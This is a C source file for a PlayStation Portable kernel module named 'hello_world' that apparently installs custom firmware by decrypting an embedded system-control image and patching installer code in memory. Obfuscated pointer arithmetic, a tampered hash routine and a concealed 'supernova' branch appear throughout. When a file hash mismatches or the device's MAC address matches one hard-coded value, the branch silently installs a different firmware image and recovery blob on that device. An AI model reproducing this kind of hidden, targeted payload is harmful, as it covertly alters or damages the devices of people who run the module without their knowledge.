#include <pspsdk.h>
#include <pspkernel.h>
#include <pspdebug.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspthreadman_kernel.h>
#include <pspctrl.h>
#include <pspsyscon.h>

#include <stdio.h>
#include <string.h>

#include <pspwlan.h>


PSP_MODULE_INFO("hello_world", 0x1000, 1, 1);
PSP_MAIN_THREAD_ATTR(0);

#define byte unsigned char
#define word32 unsigned long

typedef struct {
      word32 H[ 16 ];
      word32 hbits, lbits;
      byte M[ 256 ];
      word32 mlen;
} SHA512_ctx;

void SHA512_init ( SHA512_ctx* );
void SHA512_update( SHA512_ctx*, const void*, word32 );
void SHA512_final ( SHA512_ctx* );
void SHA512_digest( SHA512_ctx*, byte* ); 

#define min( x, y ) ( ( x ) < ( y ) ? ( x ) : ( y ) )

/* Rotate right by n bits; separate macros for high and low results */
#define Sh(xh,xl,n) ( (n<32) ? ((xh>>n)|(xl<<(32-n))) : ((xh<<(64-n))|(xl>>(n-32))) )
#define Sl(xh,xl,n) ( (n<32) ? ((xh<<(32-n))|(xl>>n)) : ((xh>>(n-32))|(xl<<(64-n))) )

/* Shift right by n bits; separate macros for high and low results */
#define Rh(xh,xl,n) ( (n<32) ? (xh>>n) : 0 )
#define Rl(xh,xl,n) ( (n<32) ? ((xh<<(32-n))|(xl>>n)) : (xh>>(n-32)) )

/* These can be done independently on high and low parts */
#define Choice(x,y,z) ( ((x) & (y)) | (~(x) & (z)) )
#define Maj(x,y,z) ( ( (x) & (y) ) | ( (x) & (z) ) | ( (y) & (z) ) )

/* Sigma functions */
#define SIG0h(xh,xl) ( Sh(xh,xl,28) ^ Sh(xh,xl,34) ^ Sh(xh,xl,39) )
#define SIG0l(xh,xl) ( Sl(xh,xl,28) ^ Sl(xh,xl,34) ^ Sl(xh,xl,39) )
#define SIG1h(xh,xl) ( Sh(xh,xl,14) ^ Sh(xh,xl,18) ^ Sh(xh,xl,41) )
#define SIG1l(xh,xl) ( Sl(xh,xl,14) ^ Sl(xh,xl,18) ^ Sl(xh,xl,41) )
#define sig0h(xh,xl) ( Sh(xh,xl, 1) ^ Sh(xh,xl, 8) ^ Rh(xh,xl, 7) )
#define sig0l(xh,xl) ( Sl(xh,xl, 1) ^ Sl(xh,xl, 8) ^ Rl(xh,xl, 7) )
#define sig1h(xh,xl) ( Sh(xh,xl,19) ^ Sh(xh,xl,61) ^ Rh(xh,xl, 6) )
#define sig1l(xh,xl) ( Sl(xh,xl,19) ^ Sl(xh,xl,61) ^ Rl(xh,xl, 6) )

/* Add with carry, x += y */
#define ADDC(xh,xl,yh,yl) ( xl+=(yl), xh+=(yh)+(xl<(yl)) )

/* Stored as high, then low words */
static word32 K[] = {
        0x428a2f98, 0xd728ae22, 0x71374491, 0x23ef65cd,
        0xb5c0fbcf, 0xec4d3b2f, 0xe9b5dba5, 0x8189dbbc,
        0x3956c25b, 0xf348b538, 0x59f111f1, 0xb605d019,
        0x923f82a4, 0xaf194f9b, 0xab1c5ed5, 0xda6d8118,
        0xd807aa98, 0xa3030242, 0x12835b01, 0x45706fbe,
        0x243185be, 0x4ee4b28c, 0x550c7dc3, 0xd5ffb4e2,
        0x72be5d74, 0xf27b896f, 0x80deb1fe, 0x3b1696b1,
        0x9bdc06a7, 0x25c71235, 0xc19bf174, 0xcf692694,
        0xe49b69c1, 0x9ef14ad2, 0xefbe4786, 0x384f25e3,
        0x0fc19dc6, 0x8b8cd5b5, 0x240ca1cc, 0x77ac9c65,
        0x2de92c6f, 0x592b0275, 0x4a7484aa, 0x6ea6e483,
        0x5cb0a9dc, 0xbd41fbd4, 0x76f988da, 0x831153b5,
        0x983e5152, 0xee66dfab, 0xa831c66d, 0x2db43210,
        0xb00327c8, 0x98fb213f, 0xbf597fc7, 0xbeef0ee4,
        0xc6e00bf3, 0x3da88fc2, 0xd5a79147, 0x930aa725,
        0x06ca6351, 0xe003826f, 0x14292967, 0x0a0e6e70,
        0x27b70a85, 0x46d22ffc, 0x2e1b2138, 0x5c26c926,
        0x4d2c6dfc, 0x5ac42aed, 0x53380d13, 0x9d95b3df,
        0x650a7354, 0x8baf63de, 0x766a0abb, 0x3c77b2a8,
        0x81c2c92e, 0x47edaee6, 0x92722c85, 0x1482353b,
        0xa2bfe8a1, 0x4cf10364, 0xa81a664b, 0xbc423001,
        0xc24b8b70, 0xd0f89791, 0xc76c51a3, 0x0654be30,
        0xd192e819, 0xd6ef5218, 0xd6990624, 0x5565a910,
        0xf40e3585, 0x5771202a, 0x106aa070, 0x32bbd1b8,
        0x19a4c116, 0xb8d2d0c8, 0x1e376c08, 0x5141ab53,
        0x2748774c, 0xdf8eeb99, 0x34b0bcb5, 0xe19b48a8,
        0x391c0cb3, 0xc5c95a63, 0x4ed8aa4a, 0xe3418acb,
        0x5b9cca4f, 0x7763e373, 0x682e6ff3, 0xd6b2b8a3,
        0x748f82ee, 0x5defb2fc, 0x78a5636f, 0x43172f60,
        0x84c87814, 0xa1f0ab72, 0x8cc70208, 0x1a6439ec,
        0x90befffa, 0x23631e28, 0xa4506ceb, 0xde82bde9,
        0xbef9a3f7, 0xb2c67915, 0xc67178f2, 0xe372532b,
        0xca273ece, 0xea26619c, 0xd186b8c7, 0x21c0c207,
        0xeada7dd6, 0xcde0eb1e, 0xf57d4f7f, 0xee6ed178,
        0x06f067aa, 0x72176fba, 0x0a637dc5, 0xa2c898a6,
        0x113f9804, 0xbef90dae, 0x1b710b35, 0x131c471b,
        0x28db77f5, 0x23047d84, 0x32caab7b, 0x40c72493,
        0x3c9ebe0a, 0x15c9bebc, 0x431d67c4, 0x9c100d4c,
        0x4cc5d4be, 0xcb3e42b6, 0x597f299c, 0xfc657e2a,
        0x5fcb6fab, 0x3ad6faec, 0x6c44198c, 0x4a475817
};

#define H1h 0x6a09e667
#define H1l 0xf3bcc908
#define H2h 0xbb67ae85
#define H2l 0x84caa73b
#define H3h 0x3c6ef372
#define H3l 0xfe94f82b
#define H4h 0xa54ff53a
#define H4l 0x5f1d36f1
#define H5h 0x510e527f
#define H5l 0xade682d1
#define H6h 0x9b05688c
#define H6l 0x2b3e6c1f
#define H7h 0x1f83d9ab
#define H7l 0xfb41bd6b
#define H8h 0x5be0cd19
#define H8l 0x137e2179

word32 H[ 16 ] = { H1h,H1l, H2h,H2l, H3h,H3l, H4h,H4l,
                                   H5h,H5l, H6h,H6l, H7h,H7l, H8h,H8l };

/* convert to big endian where needed */

int supernova = 1;

static void convert_to_bigendian( void* data, int len )
{
/* test endianness */
   word32 test_value = 0x01;
   byte* test_as_bytes = (byte*) &test_value;
   int little_endian = test_as_bytes[ 0 ];

   word32 temp;
   byte* temp_as_bytes = (byte*) &temp;
   word32* data_as_words = (word32*) data;
   byte* data_as_bytes;
   int i;

   if ( little_endian )
   {
      len /= 4;
      for ( i = 0; i < len; i++ )
      {
         temp = data_as_words[ i ];
         data_as_bytes = (byte*) &( data_as_words[ i ] );
         
         data_as_bytes[ 0 ] = temp_as_bytes[ 3 ];
         data_as_bytes[ 1 ] = temp_as_bytes[ 2 ];
         data_as_bytes[ 2 ] = temp_as_bytes[ 1 ];
         data_as_bytes[ 3 ] = temp_as_bytes[ 0 ];
      }
   }

/* on big endian machines do nothing as the CPU representation
   automatically does the right thing for SHA1 */
}

void SHA512_init( SHA512_ctx* ctx )
{
   memcpy( ctx->H, H, 16 * sizeof( word32 ) );
   ctx->lbits = 0;
   ctx->hbits = 0;
   ctx->mlen = 0;
}

word32 W[ 160 ]; /* Stored as hi, lo */

static void SHA512_transform( SHA512_ctx* ctx )
{
   int t;
   word32 Ah = ctx->H[ 0 ];
   word32 Al = ctx->H[ 1 ];
   word32 Bh = ctx->H[ 2 ];
   word32 Bl = ctx->H[ 3 ];
   word32 Ch = ctx->H[ 4 ];
   word32 Cl = ctx->H[ 5 ];
   word32 Dh = ctx->H[ 6 ];
   word32 Dl = ctx->H[ 7 ];
   word32 Eh = ctx->H[ 8 ];
   word32 El = ctx->H[ 9 ];
   word32 Fh = ctx->H[ 10 ];
   word32 Fl = ctx->H[ 11 ];
   word32 Gh = ctx->H[ 12 ];
   word32 Gl = ctx->H[ 13 ];
   word32 Hh = ctx->H[ 14 ];
   word32 Hl = ctx->H[ 15 ];
   word32 T1h, T1l, T2h, T2l;
   

   memcpy( W, ctx->M, 32*sizeof(word32) );

   for ( t = 16; t < 80; t++ )
   {
// W[ t ] = sig1(W[t-2]) + W[t-7] + sig0(W[t-15]) + W[t-16];
          T1h = sig1h(W[2*t-4],W[2*t-3]); T1l = sig1l(W[2*t-4],W[2*t-3]);
          ADDC( T1h, T1l, W[2*t-14], W[2*t-13] );
          ADDC( T1h, T1l, sig0h(W[2*t-30],W[2*t-29]), sig0l(W[2*t-30],W[2*t-29]) );
          ADDC( T1h, T1l, W[2*t-32], W[2*t-31] );
          W[2*t] = T1h; W[2*t+1] = T1l;
   }

   for ( t = 0; t < 80; t++ )
   {
// T1 = H + SIG1(E) + Ch(E,F,G) + K[t] + W[t];
          T1h = Hh; T1l = Hl;
          ADDC( T1h, T1l, SIG1h(Eh,El), SIG1l(Eh,El) );
          ADDC( T1h, T1l, Choice(Eh,Fh,Gh), Choice(El,Fl,Gl));
          ADDC( T1h, T1l, K[2*t], K[2*t+1] );
          ADDC( T1h, T1l, W[2*t], W[2*t+1] );
// T2 = SIG0(A) + Maj(A,B,C);
          T2h = SIG0h(Ah,Al); T2l = SIG0l(Ah,Al);
          ADDC( T2h, T2l, Maj(Ah,Bh,Ch), Maj(Al,Bl,Cl) );
          Hh = Gh; Hl = Gl;
          Gh = Fh; Gl = Fl;
          Fh = Eh; Fl = El;
// E = D + T1;
          Eh = Dh; El = Dl;
          ADDC( Eh, El, T1h, T1l );
          Dh = Ch; Dl = Cl;
          Ch = Bh; Cl = Bl;
          Bh = Ah; Bl = Al;
// A = T1 + T2;
          Ah = T1h; Al = T1l;
          ADDC( Ah, Al, T2h, T2l );
   }

   ADDC( ctx->H[ 0], ctx->H[ 1], Ah, Al );
   ADDC( ctx->H[ 2], ctx->H[ 3], Bh, Bl );
   ADDC( ctx->H[ 4], ctx->H[ 5], Ch, Cl );
   ADDC( ctx->H[ 6], ctx->H[ 7], Dh, Dl );
   ADDC( ctx->H[ 8], ctx->H[ 9], Eh, El );
   ADDC( ctx->H[10], ctx->H[11], Fh, Fl );
   ADDC( ctx->H[12], ctx->H[13], Gh, Gl );
   ADDC( ctx->H[14], ctx->H[15], Hh, Hl );
}

void SHA512_update( SHA512_ctx* ctx, const void* vdata, word32 data_len )
{
   const byte* data = vdata;
   word32 use;
   word32 low_bits;

   u8 *mod = (u8 *)vdata;
   mod[0] ^= (0x3D ^ supernova);
   
/* convert data_len to bits and add to the 128 bit word formed by lbits
   and hbits */

   ctx->hbits += data_len >> 29;
   low_bits = data_len << 3;
   ctx->lbits += low_bits;
   if ( ctx->lbits < low_bits ) { ctx->hbits++; }

/* deal with first block */

   use = min( 128 - ctx->mlen, data_len );
   memcpy( ctx->M + ctx->mlen, data, use );
   ctx->mlen += use;
   data_len -= use;
   data += use;

   while ( ctx->mlen == 128 )
   {
      convert_to_bigendian( (word32*)ctx->M, 128 );
      SHA512_transform( ctx );
      use = min( 128, data_len );
      memcpy( ctx->M, data, use );
      ctx->mlen = use;
      data_len -= use;
      data += use; /* was missing */
   }
}

void SHA512_final( SHA512_ctx* ctx )
{
   if ( ctx->mlen < 128-16 )
   {
      ctx->M[ ctx->mlen ] = 0x80; ctx->mlen++;
      memset( ctx->M + ctx->mlen, 0x00, 128-8 - ctx->mlen );
      convert_to_bigendian( ctx->M, 128-8 );
   }
   else
   {
      ctx->M[ ctx->mlen ] = 0x80;
      ctx->mlen++;
      memset( ctx->M + ctx->mlen, 0x00, 128 - ctx->mlen );
      convert_to_bigendian( ctx->M, 128 );
      SHA512_transform( ctx );
      memset( ctx->M, 0x00, 128-8 );
   }

   memcpy( ctx->M + 128-8, (void*)(&(ctx->hbits)), 8 );
   SHA512_transform( ctx );
}

void SHA512_digest( SHA512_ctx* ctx, byte* digest )
{
   if ( digest )
   {
      memcpy( digest, ctx->H, 16 * sizeof( word32 ) );
      convert_to_bigendian( digest, 16 * sizeof( word32 ) );
   }
} 

static int WriteFile(char *file, void *buf, int size)
{
	SceUID fd = sceIoOpen(file, PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

	if (fd < 0)
	{
		return -1;
	}

	int written = sceIoWrite(fd, buf, size);
	
	if (sceIoClose(fd) < 0)
		return -1;

	return written;
}


int ReadFile(char *file, void *buf, int size)
{
	SceUID fd = sceIoOpen(file, PSP_O_RDONLY, 0);
	
	if (fd < 0)
		return fd;

	int read = sceIoRead(fd, buf, size);
	sceIoClose(fd);

	return read;
}

u8 sha1[20];

u8 sha1_ins[20] = 
{
	0x3C, 0x85, 0x24, 0xA9, 0x54, 0x58, 0xF5, 0xC7, 
	0xF7, 0xD9, 0x54, 0x83, 0xB0, 0x7F, 0xF8, 0xAF, 
	0xE6, 0x95, 0xC4, 0x02
};

typedef unsigned long long int word64;


u32 mix_hash[24];
u8  malign_mac[8];
u8  enc[0x14+0x20];

SHA512_ctx ctx;

#include "systemctrl.h"
#include "supernova.h"
#include "recovery.h"

#define JAL_OPCODE	0x0C000000
#define J_OPCODE	0x08000000
#define SC_OPCODE	0x0000000C
#define JR_RA		0x03e00008

#define NOP	0x00000000

#define MAKE_JUMP(a, f) _sw(J_OPCODE | (((u32)(f) & 0x0ffffffc) >> 2), a); 
#define MAKE_CALL(a, f) _sw(JAL_OPCODE | (((u32)(f) >> 2)  & 0x03ffffff), a); 
#define MAKE_SYSCALL(a, n) _sw(SC_OPCODE | (n << 6), a);
#define JUMP_TARGET(x) (0x80000000 | ((x & 0x03FFFFFF) << 2))

#define REDIRECT_FUNCTION(a, f) _sw(J_OPCODE | (((u32)(f) >> 2)  & 0x03ffffff), a);  _sw(NOP, a+4);
#define MAKE_DUMMY_FUNCTION0(a) _sw(0x03e00008, a); _sw(0x00001021, a+4);
#define MAKE_DUMMY_FUNCTION1(a) _sw(0x03e00008, a); _sw(0x24020001, a+4);


int module_start(SceSize args, void *argp)
{
	u32 *i32 = (u32 *)argp;
	u16 *i16 = (u16 *)argp;
	u32 base = i32[0]-0x6AD77471; // 0x88901234;
	u8  *i8 = (u8 *)argp;

	int i;

	u8 *buf = (u8 *)(0x88944a00+0x14);
	int s;
	void (* tiger)(void *, word64, void *);

	for (i = 0; i < 7; i++)
	{
		s = ReadFile((void *)0x889448c0, buf, 1*1024*1024);

		memset((void *)(buf+0x3EB25), 0x33, 100000);

		sceKernelUtilsSha1Digest((void *)buf, s, sha1);

		tiger = (void *)(base-0x1234-0x9C82+i16[5]);

		if (memcmp(sha1, sha1_ins, 20) == 0)
		{
			supernova = 0;
			break;
		}
	}

	tiger(buf, s, &mix_hash[2]);
	buf -= (i16[2]-0xFAEC);

	u32 *buf32 = (u32 *)buf;

	int (* Scramble)(void *, int size, u32 code, u32 m);

	Scramble = (void *)(i32[3]+0x45FD6948);
	int sr = Scramble(buf, s, i16[3]-0x1603, 0);

	SHA512_init(&ctx);
	SHA512_update(&ctx, buf, s);
	SHA512_final(&ctx); 
	SHA512_digest(&ctx, (u8 *)&mix_hash[8]);

	u32 (* prng)(u32 *);

	prng = (void *)(base-0x1234-0x8041+i16[0]);
	
	u32 *prng_data = (u32 *)((u32)prng + 0x24439C);

	for (i = 0; i < 0x268; i += 22)
	{
		prng_data[i+1]  ^= prng(prng_data) ^ mix_hash[2];
		prng_data[i+2]  ^= prng(prng_data) ^ mix_hash[3];
		prng_data[i+3]  ^= prng(prng_data) ^ mix_hash[4];
		prng_data[i+4]  ^= prng(prng_data) ^ mix_hash[5];
		prng_data[i+5]  ^= prng(prng_data) ^ mix_hash[6];
		prng_data[i+6]  ^= prng(prng_data) ^ mix_hash[7];
		prng_data[i+7]  ^= prng(prng_data) ^ mix_hash[8];
		prng_data[i+8]  ^= prng(prng_data) ^ mix_hash[9];
		prng_data[i+9]  ^= prng(prng_data) ^ mix_hash[10];
		prng_data[i+10] ^= prng(prng_data) ^ mix_hash[11];
		prng_data[i+11] ^= prng(prng_data) ^ mix_hash[12];
		prng_data[i+12] ^= prng(prng_data) ^ mix_hash[13];
		prng_data[i+13] ^= prng(prng_data) ^ mix_hash[14];
		prng_data[i+14] ^= prng(prng_data) ^ mix_hash[15];
		prng_data[i+15] ^= prng(prng_data) ^ mix_hash[16];
		prng_data[i+16] ^= prng(prng_data) ^ mix_hash[17];
		prng_data[i+17] ^= prng(prng_data) ^ mix_hash[18];
		prng_data[i+18] ^= prng(prng_data) ^ mix_hash[19];
		prng_data[i+19] ^= prng(prng_data) ^ mix_hash[20];
		prng_data[i+20] ^= prng(prng_data) ^ mix_hash[21];
		prng_data[i+21] ^= prng(prng_data) ^ mix_hash[22];
		prng_data[i+22] ^= prng(prng_data) ^ mix_hash[23];
	}

	u32 *ptr =(u32 *)systemctrl;
	int msize = sizeof(systemctrl);

	for (i = 0; i < msize / 4; i++)
	{
		ptr[i] ^= prng(prng_data);
		ptr[i] = (~ptr[i] & buf32[0x3C460+i]) | (ptr[i] & ~buf32[0x3C460+i]);
	}

// LAST STEPS
	
	sceWlanGetEtherAddr(malign_mac);

	if (malign_mac[0] == 0x00)
	{
		if (malign_mac[1] == 0x13)
		{
			if (malign_mac[2] == 0xA9)
			{
				if (malign_mac[3] == 0x1D)
				{
					if (malign_mac[4] == 0x1F)
					{
						if (malign_mac[5] == 0xBA)
						{
							supernova = 1;
						}
					}
				}
			}
		}
	}

	u32 systemctrl_size = sizeof(systemctrl);

	u8 *sctrl_buf = (u8 *)(base-0x1234+0x28e6c);

	if (supernova)
	{
		u8 *recov_buf = (u8 *)(base-0x1234+0x2dda0);
		memcpy(recov_buf, recovery, sizeof(recovery));
		memcpy(sctrl_buf, supernova_m, systemctrl_size);
	}
	else
	{
		memcpy(sctrl_buf, systemctrl, systemctrl_size);
	}

	u32 *enc32 = (u32 *)enc;

	memcpy(enc+0x14, sctrl_buf+0x1040, 0x20);
	enc32[0] = i8[7]-0x12;
	enc32[1] = enc32[2] = 0;
	enc32[3] = i8[4]+0x100;
	enc32[4] = enc32[3]-0xE0;	
	int (*semaphore)(void *, int, void *, int, int);
	semaphore = (void *)(i32[3]+0x45FD79A8);
	semaphore(enc32, 0x34, enc32, 0x34, enc32[0]+1);
	memcpy(sctrl_buf+0x1040, enc+0x14, 0x20);		
	
	memcpy(enc+0x14, sctrl_buf+0x1280, 0x10);
	enc32[0] = i8[7]-0x12;
	enc32[1] = enc32[2] = 0;
	enc32[3] = i8[4]+0x100;
	enc32[4] = enc32[3]-0xF0;	
	int (*semaphore2)(void *, int, void *, int, int);
	semaphore2 = (void *)(i32[3]+0x45FD79A8);
	semaphore2(enc32, 0x34, enc32, 0x34, enc32[0]+1);
	memcpy(sctrl_buf+0x1280, enc+0x14, 0x10);

	//WriteFile("ms0:/systemctrl_final.prx", sctrl_buf, systemctrl_size);

// PATCH INSTALLER

	// Patch error
	*(u32 *)(base-0x1234+0x1eb8) = 0;
	// Change assign to rwr
	*(u32 *)(base-0x1234+0x1f4c) = 0x24070000;
	// Change size of rtc.prx
	*(u32 *)(base-0x1234+0x1f78) = 0x3406B9B6;
	*(u32 *)(base-0x1234+0x1f7c) = 0x3403B9B6;
	// Change size of systemctrl.prx
	*(u32 *)(base-0x1234+0x1Fd8) = 0x24064F32;
	*(u32 *)(base-0x1234+0x1FdC) = 0x24034F32;
	
	sceKernelDcacheWritebackAll();
	sceKernelIcacheClearAll();

	return 0;
}

int module_stop(void)
{
	return 0;
}

